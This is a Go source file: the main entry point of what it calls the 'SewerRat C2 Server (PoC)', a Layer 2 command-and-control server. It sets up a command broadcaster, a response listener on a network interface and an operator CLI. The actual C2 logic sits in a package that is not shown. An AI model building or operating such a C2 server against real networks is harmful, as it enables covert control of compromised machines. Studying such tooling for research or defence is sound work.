package main

import (
	"flag"
	"log"
	"os"
	"time"

	"sewerrat/server"
)

func main() {
	// Parse command-line flags
	iface := flag.String("i", "eth0", "Network interface to use")
	timeout := flag.Duration("t", 10*time.Second, "Response timeout")
	flag.Parse()

	// Banner
	log.Println(`
╔═══════════════════════════════════╗
║     SewerRat C2 Server (PoC)      ║
║     Layer 2 Command & Control     ║
╚═══════════════════════════════════╝
	`)

	// Create broadcaster
	broadcaster, err := server.NewCommandBroadcaster(*iface)
	if err != nil {
		log.Fatalf("[!] Failed to create broadcaster: %v\n", err)
	}
	defer broadcaster.Close()

	// Create listener
	listener, err := server.NewResponseListener(*iface)
	if err != nil {
		log.Fatalf("[!] Failed to create listener: %v\n", err)
	}
	defer listener.Stop()

	// Start listener in background
	if err := listener.StartAsync(); err != nil {
		log.Fatalf("[!] Failed to start listener: %v\n", err)
	}

	// Small delay to ensure listener is ready
	time.Sleep(100 * time.Millisecond)

	// Create and start CLI handler
	cli := server.NewCLIHandler(broadcaster, listener, *timeout)
	if err := cli.Start(); err != nil {
		log.Fatalf("[!] CLI error: %v\n", err)
	}
}
